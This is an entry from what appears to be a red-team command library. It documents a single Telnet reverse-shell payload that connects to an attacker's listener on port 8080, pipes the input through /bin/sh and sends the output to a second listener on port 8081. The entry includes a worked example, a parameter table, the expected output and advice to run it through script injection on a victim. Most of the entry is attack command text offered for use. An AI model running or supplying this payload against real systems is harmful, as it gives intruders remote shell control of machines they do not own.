---
id: 41543d18-3209-40fe-8835-3cd9b2165f9f
name: telnet-pipe-shell-to-attacker
type: command
executor: bash
data: telnet $_ATTACKER_IP 8080 | /bin/sh | telnet $_ATTACKER_IP 8081
output: null
created_at: '2023-04-06T03:56:24.592556+00:00'
updated_at: '2023-04-10T20:25:31.686351+00:00'
platforms:
  - Linux
  - Unix
tags:
  - reverse-shell
  - telnet
  - payload
verified: true
validated: true
---

# telnet-pipe-shell-to-attacker

## Command

```bash
telnet $_ATTACKER_IP 8080 | /bin/sh | telnet $_ATTACKER_IP 8081
```

## Description

This command establishes a reverse shell by connecting Telnet to the attacker's listener, piping through /bin/sh for command execution, and redirecting output to a second listener. Use after starting listeners on the attacker side.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| $_ATTACKER_IP | IP address of the attacker's machine | Yes |
| 8080 | First port for input connection | Yes |
| /bin/sh | Shell interpreter for command execution | Yes |
| 8081 | Second port for output redirection | Yes |

## Examples

### Basic Usage

```bash
telnet 192.168.1.100 8080 | /bin/sh | telnet 192.168.1.100 8081
```

### Advanced Usage

Execute via compromised process or script injection on the victim.

## Expected Output

Trying 192.168.1.100...
Connected to 192.168.1.100.
Escape character is '^]'.

(Shell prompt appears on attacker's listener; commands like 'id' execute and return output.)

## Related

- [[procedures/Telnet-Reverse-Shell]]
- [[commands/nc-start-dual-listeners-for-telnet-shell]]
